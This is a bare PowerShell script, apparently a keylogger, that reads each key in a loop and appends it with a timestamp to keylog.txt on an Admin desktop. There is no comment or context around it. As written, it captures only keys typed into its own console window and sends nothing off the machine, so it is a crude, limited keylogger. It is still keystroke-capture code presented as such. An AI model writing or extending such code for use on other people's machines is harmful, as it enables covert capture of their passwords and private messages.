$LogFile = "C:\Users\Admin\Desktop\keylog.txt"

Function LogKeys {
    while ($true) {
        $Key = [System.Console]::ReadKey($true)
        $Char = $Key.KeyChar
        if ($Char -ne "`0") {
            Add-Content -Path $LogFile -Value "$([DateTime]::Now.ToString('yyyy-MM-dd HH:mm:ss')) - $Char"
        }
    }
}

LogKeys